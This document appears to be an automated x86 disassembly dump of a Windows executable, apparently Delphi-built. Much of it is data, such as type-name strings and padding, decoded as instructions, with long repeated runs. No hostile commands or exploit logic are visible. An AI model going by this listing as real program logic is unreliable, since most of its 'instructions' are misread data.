add [ eax - 0x7a ] ch
inc edi
add [ eax ] ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41e721
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e728
retn
add [ eax ] al
push 0x71004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] dh
sub_41e734
cmp bh ah
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
cwde
out 0x41 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0041e7 ] bl
add [ eax ] al
add [ eax + 0x72 ] bl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp si
out 0x41 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
out 0x41 eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
adc al 0xe8
inc ecx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax ] dl
call 0x664ae870
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
test al ch
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
je r-xdata
popa
jne r-xdata
jae r-xdata
inc esi
popad
insd
nop
push 0x10041e8
or al 0x54
je r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
call 0xffffffffc0cce929
in al dx
call 0x944e92f
push esp
push eax
outsb
push ebx
je r-xdata
sub al 0x41
add [ ebx + 0x41e8ecc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60041e8 ] al
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax - 0x17 ] dl
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xe8d4c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add al ch
call 0x7048e947
or al 0x70
jae r-xdata
jo r-xdata
outsd
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
sub al 0x41
add [ esi ] al
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
cld
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41e95490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
0x41 0x0
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rcl [ eax ] 0xea
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41e85890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ edx + ebp * 8 ] cl
inc ecx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
push es
jo r-xdata
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7ae80040 ] bl
inc ecx
add al bh
jpo r-xdata
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] bl
push ebx
jpe r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc ecx
mov eax eax
adc dl ch
inc edi
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
inc edi
jb r-xdata
add [ eax ] al
jl r-xdata
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
aam 0xea
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xea10c08b
inc [ ecx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
into
jmp r-xdata
jo r-xdata
push 0x736369
add [ ebx + 0x41eb28c0 ] cl
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
0x180041 0x0
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi * 8 - 0x16 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
nop
inc edi
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
call [ ebx + eax ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
0x35300041 0x40
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
sub bl ch
inc ecx
inc eax
add [ edx + esi + 0x2ec0040 ] bl
inc edx
add al bh
jpo r-xdata
imul sp [ ebp + 0x72 ] 0x1194
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
imul esp [ ebx + 0x73 ] 0x41ead490
fsubr st3
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx * 8 - 0x16 ] si
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
or [ edi + 0x72 ] al
popad
jl r-xdata
jmp r-xdata
popad
jo r-xdata
add [ eax ] al
add [ esi ] cl
jo r-xdata
add [ eax ] al
and al 0xeb
arpl [ ebx + 0x7 ] si
add [ eax + ebp * 8 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
add [ eax ] dh
add eax [ edx ]
push cs
inc ecx
push esp
call 0x6bdec9e
inc edx
add [ edi + eax + 0x79c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0xe8640007
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
jmp r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
test al 0xeb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 - 0x1427ffbf ] dh
add [ esi + eax + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
adc al ch
inc ecx
add [ edi + eax + 0x42 ] ah
add [ edi + eax + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41e85474
add [ esi + eax + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
[ esp + eax + 0x42 ]
out 0x41 eax
sub_41eae4
fdiv st7
inc ecx
add [ edi ] cl
push esp
inc edi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
and al 0xeb
imul esp [ ebx + 0x73 ] 0xffff0001
nop
test al 0xeb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 - 0x1427ffbf ] dh
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi * 8 - 0x16 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
jl r-xdata
jmp r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
jmp r-xdata
fsubr st3
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx * 8 - 0x16 ] si
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
or [ edi + 0x72 ] al
popad
jo r-xdata
arpl [ ebx + 0x7 ] si
add [ eax + ebp * 8 + 0x41 ] ah
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
call [ ebx + eax ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
add [ eax ] dh
add eax [ edx ]
push cs
inc ecx
0x35300041 0x40
imul esp [ ebx + 0x73 ] 0xc08b0000
sub bl ch
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41e85474
add [ esi + eax + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
[ esp + eax + 0x42 ]
out 0x41 eax
inc eax
add [ edx + esi + 0x2ec0040 ] bl
inc edx
add al bh
jpo r-xdata
imul sp [ ebp + 0x72 ] 0x1194
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
add [ esi ] cl
jo r-xdata
add [ esi + eax + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
adc al ch
inc ecx
add [ edi + eax + 0x42 ] ah
add [ edi + eax + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
push esp
call 0x6bdec9e
inc edx
add [ edi + eax + 0x79c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0xe8640007
inc ecx
sub_41eb7b
add dh cl
jmp r-xdata
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
call [ ebx + eax ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
jl r-xdata
jmp r-xdata
arpl [ ebx + 0x7 ] si
add [ eax + ebp * 8 + 0x41 ] ah
add [ edi + eax + 0x79c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add [ eax ] dh
add eax [ edx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc ecx
add [ eax ] al
add [ edx ] 0x0
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41e85474
add [ esi + eax + 0x42 ] bh
add [ esi + eax + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
adc al ch
inc ecx
add [ edi + eax + 0x42 ] ah
add [ edi + eax + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
add [ eax ] bl
add [ eax ] al
[ esp + eax + 0x42 ]
out 0x41 eax
sub_41eb7f
add [ eax + eax ] ah
add [ eax ] al
mov dl ch
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x2ec0040 ] bl
inc edx
add al bh
jpo r-xdata
popad
jo r-xdata
add [ eax ] al
push esp
call 0x6bdec9e
inc edx
imul esp [ ebx + 0x73 ] 0xe8640007
inc ecx
add [ edi + eax + 0x79c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
arpl [ ebx + 0x7 ] si
add [ eax + ebp * 8 + 0x41 ] ah
add [ eax ] dh
add eax [ edx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
call [ ebx + eax ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
add [ esi + eax + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
adc al ch
inc ecx
add [ edi + eax + 0x42 ] ah
add [ edi + eax + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41e85474
add [ esi + eax + 0x42 ] bh
out 0x41 eax
jl r-xdata
jmp r-xdata
add [ eax ] bl
add [ eax ] al
[ esp + eax + 0x42 ]
inc ecx
sub_41ec9b
push es
inc edx
add [ edi + eax ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
sub al 0x7
inc edx
add [ eax ] bh
pop es
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
and al 0xed
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp * 8 + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch ch
inc ecx
add [ eax + eax ] bl
add [ eax ] al
mov dl ch
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x8080040 ] bl
inc edx
add al bh
jpo r-xdata
pop esp
or al [ edx ]
or al [ fs : edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xe7340004
inc ecx
add [ eax + 0x9 ] dl
inc edx
add [ eax + 0x9 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0xee24c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
out dx al
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x300041ea ] cl
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0xad00040 ] bl
inc edx
add al bh
jpo r-xdata
jmp 0x59edbe
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ 0x6f6c6f43 ] al
add [ eax ] dh
or [ edx ] al
add al 0x54
push eax
outsb
lea eax [ eax ]
cmp al 0xed
inc ecx
add [ edi ] al
add al 0x54
push eax
outsb
and al 0xed
inc ecx
add al bh
0x40041 0x4708
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
call sub_42308f
0xd4c0041 0x42
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add al bh
or al [ edx ]
push es
push esp
inc edx
jb r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
jl r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add bh bh
test al 0x13
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add al ch
adc al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 ] cl
add [ eax ] al
nop
cmp al 0xee
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc ecx
add [ eax ] bl
add [ eax ] al
sbb [ ebx + 0x41 ] dl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0xe4c0040 ] bl
inc edx
add al bh
jpo r-xdata
jae r-xdata
add al 0xdc
jmp r-xdata
dec ebp
add al 0x24
retn
outsd
aam 0xeb
inc ecx
add [ eax + eax ] cl
add bh bh
call 0xffffffff8c423108
push ebx
inc ecx
add [ eax + eax ] al
out dx eax
inc ecx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
or al 0xef
and al 0xee
inc ecx
add al bh
0x20041 0x4708
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
in eax dx
inc ecx
add [ eax ] dl
add [ eax ] al
[ ebx + edx + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
imul esp [ ebx + 0x73 ] 0xee380004
mov [ ebx ] ss
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edx
or [ edi + 0x72 ] al
popad
jo r-xdata
out dx al
inc ecx
add [ ebx + edx * 2 + 0x40041 ] cl
pop ebp
retn 0x4
sub_41ee54
imul esp [ ebx + 0x73 ] 0xe7340002
inc ecx
add [ eax ] dh
or al 0x42
add [ eax ] bh
or al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
call sub_42308f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc ecx
add [ eax ] bl
add [ eax ] al
sbb [ ebx + 0x41 ] dl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0xe4c0040 ] bl
inc edx
add al bh
jpo r-xdata
0xd4c0041 0x42
inc ecx
add [ eax + eax ] dl
add [ eax ] al
jl r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add bh bh
test al 0x13
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add al ch
adc al 0x42
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
jns r-xdata
jae r-xdata
add al 0xdc
jmp r-xdata
dec ebp
add al 0x24
retn
outsd
aam 0xeb
inc ecx
add [ eax + eax ] cl
add bh bh
call 0xffffffff8c423108
push ebx
inc ecx
add [ eax + eax ] al
out dx eax
inc ecx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
in eax dx
inc ecx
add [ eax ] dl
add [ eax ] al
[ ebx + edx + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
imul esp [ ebx + 0x73 ] 0xee380004
mov [ ebx ] ss
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edx
or [ edi + 0x72 ] al
popad
jo r-xdata
out dx al
inc ecx
add [ ebx + edx * 2 + 0x40041 ] cl
pop ebp
retn 0x4
sub_41ee81
push esp
or eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
call sub_42308f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc ecx
add [ eax ] bl
add [ eax ] al
sbb [ ebx + 0x41 ] dl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0xe4c0040 ] bl
inc edx
add al bh
jpo r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
jl r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add bh bh
test al 0x13
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
